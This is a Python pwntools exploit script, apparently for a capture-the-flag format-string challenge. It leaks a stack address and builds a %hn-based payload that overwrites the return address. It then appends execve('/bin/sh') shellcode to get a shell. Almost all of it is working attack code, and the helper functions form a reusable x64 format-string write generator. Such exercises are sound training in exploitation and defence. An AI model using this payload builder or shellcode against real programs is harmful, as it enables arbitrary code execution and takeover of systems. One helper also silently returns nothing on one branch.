from pwn import *

import time

target = process("./chall-test_fmtString-9-x64")
gdb.attach(target, gdbscript="verify_exploit")

def getOverflowInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	x += 1
	return x

def get0fInt(bytesSize):
	x = 0x0
	for i in range(0, bytesSize):
		x = (x << 8)
		x = x | 0xff
	return x

def getIntSizeBytes(x):
	if x == 0:
		return 0

	byteSize = 0
	while x != 0:
		x = (x >> 8)
		byteSize += 1
	return byteSize

def getWriteSize(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted

	else:
		writeSize = getIntSizeBytes(writeValue)
		overflowInt = getOverflowInt(writeSize)
		andInt = get0fInt(writeSize)

		alreadyWritten = (writtenValue & andInt)
		reachOverflow = overflowInt - alreadyWritten

		valuePrinted = reachOverflow + writeValue 
		return valuePrinted

def genFodder(size):
	return size*"0"

def getBytesAt(value, offset, size):
	value = value >> (offset * 8)
	i = 0
	retValue = 0
	while size != 0:
		currentByte = (value & 0xff)
		value = value >> 8
		size -= 1
		currentByte = currentByte << (8*i)
		retValue = retValue | currentByte
		i += 1
	return retValue

def getStartingFmtStringOffsetsx64(positionOffset, bytesWritten, stackOffset):
	if positionOffset != 8:
		beginString = genFodder(positionOffset)
		bytesWritten += positionOffset
		stackOffset += 1
	else:
		beginString = ""
		return beginString, bytesWritten, stackOffset

def getAddressesx64(writeSizes, address):
	addresses = []
	bytesWritten = 0
	for i in range(0, len(writeSizes)):
		addresses.append(p64(address + bytesWritten))
		bytesWritten += writeSizes[i]
	return addresses

def getx64WriteSizes(value):
	writeSize = getIntSizeBytes(value)
	writeSizes = [2]*(int(writeSize / 2))
	if (writeSize % 2) != 0:
		writeSizes.append(1)
	return writeSizes

def getValuesx64(numWrites, writeSizes, value):
	values = []
	writtenBytes = 0
	for i in range(0, numWrites):
		values.append(getBytesAt(value, writtenBytes, writeSizes[i]))
		writtenBytes += writeSizes[i]
	return values

def writePrintSizesx64(numWrites, values, origBytesWritten):
	bytesWritten = origBytesWritten
	printSizes = []
	for i in range(0, numWrites):
		printSize = getWriteSize(values[i], bytesWritten)
		bytesWritten += printSize
		printSizes.append("%{size}c".format(size = printSize))
	return printSizes

def writeWritesx64(numWrites, writeSizes, stackOffset, value, fmtStrSize):
	writes = []
	stackOffset += int(fmtStrSize / 8)
	for i in range(0, numWrites):
		if writeSizes[i] == 2:
			writes.append("%{offset}$hn".format(offset=stackOffset))
		elif writeSizes[i] == 1:
			writes.append("%{offset}$hhn".format(offset=stackOffset))
		stackOffset += 1
	return writes

def getLargestFmtStrSizex64(value):
	numBytes = getIntSizeBytes(value)
	if numBytes == 1:
		return 0x10

	elif numBytes == 2:
		return 0x10

	elif numBytes == 3:
		return 0x20

	elif numBytes == 4:
		return 0x20

	elif numBytes == 5:
		return 0x30

	elif numBytes == 6:
		return 0x30

	elif numBytes == 7:
		return 0x40

	elif numBytes == 8:
		return 0x40

def generatePayloadx64(numWrites, printValues, writes, addresses, value, fmtStrSize):
	payload = ""
	for i in range(0, numWrites):
		payload += printValues[i]
		payload += writes[i]
	payload += "0"*(fmtStrSize - len(payload))
	for i in range(0, numWrites):
		payload += addresses[i]
	return payload
def getPrintSizesx64ZeroOut(numWrites, values, origBytesWritten):
	bytesWritten = origBytesWritten
	printSizes = []
	for i in range(0, numWrites):
		if values[i] == 0x0:
			printSize = 0x10000 - (bytesWritten & 0xffff)
			printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
			bytesWritten += printSize
			continue
		printSize = getWriteSizeShort(values[i], bytesWritten)
		bytesWritten += printSize
		printSizes.append("%{bytes}c".format(bytes = printSize, index=i))
	return printSizes
def getWritesx64ZeroOut(numWrites, writeSizes, stackOffset, value, fmtStrSize):
	stackOffset += int(fmtStrSize / 8)
	writes = []
	for i in range(0, numWrites):
		if writeSizes[i] == 2:
			writes.append("%{offset}$hn".format(offset=stackOffset))
		elif writeSizes[i] == 1:
			writes.append("%{offset}$hhn".format(offset=stackOffset))
		stackOffset += 1
	return writes

def getWriteSizeShort(writeValue, writtenValue):
	if writeValue > writtenValue:
		valuePrinted = writeValue - writtenValue
		return valuePrinted
	else:
		writeSize = 2
		overflowInt = getOverflowInt(writeSize)
		targetValue = overflowInt + writeValue
		andInt = get0fInt(writeSize)
		valuePrinted = targetValue - (writtenValue & 0xffff)
		return valuePrinted
target.recvuntil("Tell me I was never good enough: ")
leak = int(target.recvuntil("\n").strip("\n"), 16)
print "target address is: " + hex(leak)

retAddress = leak + 520
inputAddress = leak - (520 - 520)

stackOffset = 6
bytesOffset = 0
positionOffset = 8


value = inputAddress + 0x60

address = retAddress

writeSizes = [2, 2, 2, 2]
numWrites = 4
fmtStrSize = 0x40
addresses = getAddressesx64(writeSizes, address)

values = getValuesx64(numWrites, writeSizes, value)

beginString, bytesWritten, stackOffset = getStartingFmtStringOffsetsx64(positionOffset, bytesOffset, stackOffset)

printValues = getPrintSizesx64ZeroOut(numWrites, values, bytesWritten)

writes = getWritesx64ZeroOut(numWrites, writeSizes, stackOffset, value, fmtStrSize)

payload = generatePayloadx64(numWrites, printValues, writes, addresses, value, fmtStrSize)

payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
target.sendline(payload)
target.recvall(timeout = 2)
